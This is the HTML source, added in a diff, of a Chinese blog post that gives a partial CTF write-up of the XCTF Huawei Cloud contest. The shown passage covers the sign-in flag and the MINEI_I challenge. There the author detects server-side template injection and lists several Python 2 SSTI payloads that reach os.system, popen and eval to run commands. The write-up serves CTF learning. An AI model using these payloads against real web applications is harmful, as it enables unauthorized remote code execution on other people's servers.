@@ -1,0 +1,960 @@
+<!DOCTYPE html><html lang="en"><head><!-- hexo injector head_begin start --><link href="https://cdn.jsdelivr.net/npm/hexo-widget-tree@0.1.1/css/index.css" rel="stylesheet"/><!-- hexo injector head_begin end --><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Morouu"><meta name="copyright" content="Morouu"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>XCTF高校网络安全专题挑战赛(华为云场)部分WP | Morouu的大狗窝 ●'◡'●</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
+  [".post-card",".post-content img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+});
+</script><link class="aplayer-style-marker" rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script class="aplayer-script-marker" src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" defer></script><script class="meting-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js" defer></script><script src="/js/pjax.js" defer></script><script src="https://cdn.jsdelivr.net/npm/vue@2.6.11"></script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="shortcut icon" type="image/svg+xml" href="/logo.jpg"><link rel="mask-icon" href="/logo.jpg" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
+    const Yun = window.Yun || {};
+    window.CONFIG = {"hostname":"morblog.cc","root":"/","title":"Morouu的大狗窝","version":"1.5.1","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><meta name="description" content="终究是摸🐟了，感觉有很多地方需要多加学习。不管怎么说继续努力吧！！！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XCTF高校网络安全专题挑战赛(华为云场)部分WP">
+<meta property="og:url" content="https://morblog.cc/posts/27220/index.html">
+<meta property="og:site_name" content="Morouu的大狗窝 ●&#39;◡&#39;●">
+<meta property="og:description" content="终究是摸🐟了，感觉有很多地方需要多加学习。不管怎么说继续努力吧！！！">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/I6oGESWaOsVtMBc.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/6wbVu24Aqk7Np9t.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/d79lP8tUx1brVOg.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/NqtIrXuiWFmkCga.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/8nu29faOyqMWKsv.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/54bqOZTt769zrcI.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/23/FrMxTIJeXwgRYcW.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/tBCJpKo3Nbjeua6.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/6HFTejiayWbg2vB.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/H7KuiVyCxb1rZ2s.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/GuQBK4qtJdzxe9A.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/w9td1ZPuBeS6fMs.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/caRiBVQ4OnueyZf.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/jOLQEXWDitd4gqo.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/TecMyim12kUFtLP.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/bnykNQEpY64rOvU.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/DTWkeS4FihOElq1.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/qZOmiRaoVdCwJEA.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/v85Mjs2nygqVTDa.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/JMYAHing53hLUfb.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/BGl5ug1cpMIwPU9.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/o7L52PWfHeO8sgb.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/jk1izZgnBMcHDpy.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/guwEiPUKmXZIDr5.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/P8WbfKlND2cEHxh.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/NbjPTiKcEhHXz13.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/zjqsXrknRUyIpNt.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/nWEcDhRjHXkTbG2.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/qjeAS1Exa8QNbL2.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/9RWtG41Tq8warYN.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/uD9YWymlV2RPfd6.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/A38hw24aBpcjoqd.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/Ui6wzn8NPMvKy2D.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/TqZmY1SvPGzD2hK.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/nTJWtw2PecpAVNb.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/f6PlkSZD3CLzEin.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/LpPO6N5cV7HxiXE.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/Cu3GQAHeLwdhUko.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/gsqcStn4ITmaPMD.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/aHze3qMdOYyUtFN.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/JnymY3TEIbQPkOw.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/fZChVUd4qOKBHAN.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/cPuZYbUFlWXzk9x.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/Jq7WPfMAKRNgQzF.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/AHGCb8q7kSKr2Iw.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/BM1x7Ha8F9Ngd3I.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/hKUYtVEJszIPkBe.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/22/vY2gyZQb9ueitHE.png">
+<meta property="article:published_time" content="2020-12-22T15:03:53.000Z">
+<meta property="article:modified_time" content="2021-03-03T14:47:58.236Z">
+<meta property="article:author" content="Morouu">
+<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/12/22/I6oGESWaOsVtMBc.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><canvas id="trianglifyContainer"></canvas><script defer src="https://cdn.jsdelivr.net/npm/trianglify@4/dist/trianglify.bundle.js"></script><script>document.addEventListener("DOMContentLoaded", () => {
+  const pattern = trianglify({
+    width: 800,
+    height: 600,
+    cellSize: 75,
+    palette: ["YlGnBu", "GnBu", "Purples", "Blues"],
+  });
+  const canvasOpts = {
+    applyCssScaling: false
+  }
+  document.body.appendChild(pattern.toCanvas(trianglifyContainer, canvasOpts));
+});</script><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Morouu"><img width="96" loading="lazy" src="/images/tx.png" alt="Morouu"><span class="site-author-status" title="即便是到了最灰暗的时候，也决不要放弃">😊</span></a><div class="site-author-name"><a href="/about/">Morouu</a></div><span class="site-name">Morouu的大狗窝 ●'◡'●</span><sub class="site-subtitle">从何时起开始害怕遥望星辰.</sub><div class="site-desciption">一个不相信命运却总想着时刻保持温柔的家伙</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">22</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">29</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">16</span></a></div><div class="site-state-item"><a href="/about/"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg></span></a></div><a class="site-state-item hty-icon-button" href="https://morblog.cc" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://qm.qq.com/cgi-bin/qm/qr?k=fWedgqUErGcge7o_VeuMGd-rvqF6ofu0&amp;noverify=0" title="QQ 229292073" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/morouu" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://u.wechat.com/MD4_hJ7v3BFP-TEc54DBoS4" title="Wechat" target="_blank" style="color:#1AAD19"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-2-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:morouure@gmail.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:pink"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-open-arm-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XCTF%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98%E6%8C%91%E6%88%98%E8%B5%9B-%E5%8D%8E%E4%B8%BA%E4%BA%91-12-20%E5%9C%BA"><span class="toc-number">1.</span> <span class="toc-text">XCTF高校网络安全专题挑战赛(华为云,12.20场)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.1.</span> <span class="toc-text">WEB:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MINEI-I"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">MINEI_I</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MINE2"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">MINE2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PYER"><span class="toc-number">1.1.0.4.</span> <span class="toc-text">PYER</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HIDS"><span class="toc-number">1.1.0.5.</span> <span class="toc-text">HIDS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WEBSHELL-I%EF%BC%88%E6%9C%AA%E8%A7%A3%EF%BC%8C%E5%A4%8D%E7%8E%B0%E6%88%90%E5%8A%9F%EF%BC%89"><span class="toc-number">1.1.0.6.</span> <span class="toc-text">WEBSHELL_I（未解，复现成功）</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div><div class="tag-cloud"><div class="tag-cloud-tags"><a href="/tags/CRYPTO/" style="font-size: 17.14px; color: #6d90af">CRYPTO</a> <a href="/tags/CTF/" style="font-size: 24.86px; color: #2c81d1">CTF</a> <a href="/tags/MISC/" style="font-size: 14.57px; color: #8394a4">MISC</a> <a href="/tags/PHP/" style="font-size: 12px; color: #999">PHP</a> <a href="/tags/Python/" style="font-size: 12px; color: #999">Python</a> <a href="/tags/WEB/" style="font-size: 27.43px; color: #167ddc">WEB</a> <a href="/tags/%E5%90%AC%E5%90%8E%E6%84%9F/" style="font-size: 17.14px; color: #6d90af">听后感</a> <a href="/tags/%E5%A4%87%E5%BF%98%E5%BD%95/" style="font-size: 12px; color: #999">备忘录</a> <a href="/tags/%E5%A4%A7%E5%AE%B6%E5%A5%BD/" style="font-size: 12px; color: #999">大家好</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 30px; color: #0078e7">安全</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 17.14px; color: #6d90af">工具</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 12px; color: #999">杂项</a> <a href="/tags/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0%E8%80%8C%E5%B7%B2/" style="font-size: 12px; color: #999">测试文章而已</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 19.71px; color: #578bba">渗透</a> <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 22.29px; color: #4286c6">随笔</a> <a href="/tags/%E9%9D%9E%E9%A2%84%E6%9C%9F/" style="font-size: 12px; color: #999">非预期</a></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://morblog.cc/posts/27220/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Morouu"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Morouu的大狗窝 ●'◡'●"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">XCTF高校网络安全专题挑战赛(华为云场)部分WP</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <span class="post-meta-icon-text">Posted on</span> <time title="Created: 2020-12-22 23:03:53" itemprop="dateCreated datePublished" datetime="2020-12-22T23:03:53+08:00">2020-12-22</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <span class="post-meta-icon-text">Edited on</span> <time title="Modified: 2021-03-03 22:47:58" itemprop="dateModified" datetime="2021-03-03T22:47:58+08:00">2021-03-03</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-file-word-line"></use></svg></span> <span title="Word count in article">10.1k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-timer-line"></use></svg></span> <span title="Reading time">42m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Views"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/CTF/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">CTF</span></a></span> > <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/CTF/2020/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">2020</span></a></span> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/WP/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">WP</span></a></span> > <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/CTF/2020/XCTF%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98%E6%8C%91%E6%88%98%E8%B5%9B-%E5%8D%8E%E4%B8%BA%E4%BA%91%E5%9C%BA-%E9%83%A8%E5%88%86WP/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">XCTF高校网络安全专题挑战赛(华为云场)部分WP</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag" href="/tags/WEB/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">WEB</span></a><a class="tag" href="/tags/%E5%AE%89%E5%85%A8/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">安全</span></a><a class="tag" href="/tags/CTF/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">CTF</span></a></span></div><div class="post-author"><div class="author-avatar"><img src="https://www.gravatar.com/avatar/78b1c437d72cc247eeac098553bbf4a6?s=20&amp;d=https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2FYunYouJun%2Fcdn%2Fimg%2Favatar%2Fnone.jpg"></div><span class="author-name">morouu</span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><p><em>终究是摸🐟了，感觉有很多地方需要多加学习。不管怎么说继续努力吧！！！</em></p>
+<span id="more"></span>
+
+<h1 id="XCTF高校网络安全专题挑战赛-华为云-12-20场"><a href="#XCTF高校网络安全专题挑战赛-华为云-12-20场" class="headerlink" title="XCTF高校网络安全专题挑战赛(华为云,12.20场)"></a>XCTF高校网络安全专题挑战赛(华为云,12.20场)</h1><p>战队名称：<strong>咕噜灵波~</strong></p>
+<p>战队排名：<strong>29</strong></p>
+<p>排名截图：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/I6oGESWaOsVtMBc.png" alt="image-20201221164007719.png" loading="lazy"></p>
+</blockquote>
+<hr>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB:"></a>WEB:</h2><h4 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h4><p>​        直接关注 <strong>”华为云公众号“</strong>，然后输入<strong>”ctf“</strong>，即可非常牛逼地得到了 <strong>flag</strong>:</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/6wbVu24Aqk7Np9t.jpg" alt="qiandao1.jpg" loading="lazy"></p>
+</blockquote>
+<p>​        得到flag：<code>flag&#123;w3lc0m3_to_huAw3iXCTF&#125;</code></p>
+<pre class="language-none"><code class="language-none">flag&#123;w3lc0m3_to_huAw3iXCTF&#125;</code></pre>
+
+<p>​        后话：</p>
+<p>​                好像没啥可说的0.0，看一下公众号就阔以啦。</p>
+<hr>
+<h4 id="MINEI-I"><a href="#MINEI-I" class="headerlink" title="MINEI_I"></a>MINEI_I</h4><p>​        emmm，开局就给了个扫雷游戏，然后就稍微的玩了好一会，没通关。后来另一个扫雷大佬队友通关了，跳转到了如下的页面：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/d79lP8tUx1brVOg.png" alt="image-20201221165112066.png" loading="lazy"></p>
+</blockquote>
+<p>（实际上F12也能源码中看出对应的跳转：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/NqtIrXuiWFmkCga.png" alt="image-20201221165309435.png" loading="lazy"></p>
+</blockquote>
+<p>​        这里回到正题，一个简单的传参点，外加对传参数据的回显，很容易让人想到，这很可能考的是一个 <strong>”SSTI“</strong>，那么先进行简单的测试：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/8nu29faOyqMWKsv.png" alt="image-20201221165456632.png" loading="lazy"></p>
+</blockquote>
+<p>​        当输入简单的 <code>&#123;&#123;2333*1&#125;&#125;</code> 时候，得到结果 <code>2333</code>，此时可以断定这里是可以进行模板注入的了。</p>
+<p>​        那么下一步是简单的看这个是多少版本的python：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/54bqOZTt769zrcI.png" alt="image-20201221165605815.png" loading="lazy"></p>
+</blockquote>
+<p>​        显然这里是 <code>python2.7.18</code> 的，可以先把 <code>python2</code> 的 <strong>SSTI</strong> 的payload简单的选一个可以 <strong>rce</strong> 的：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">71</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>
+
+<span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").system("ls")'</span><span class="token punctuation">)</span>
+
+<span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__call__<span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span><span class="token string">'os.system("ls")'</span><span class="token punctuation">)</span>
+
+<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__getattribute__<span class="token punctuation">(</span><span class="token string">'func_globals'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'linecache'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span>
+
+<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">75</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('whoami').read()"</span><span class="token punctuation">)</span>
+
+
+<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__import__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__import__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'commands'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getstatusoutput<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+
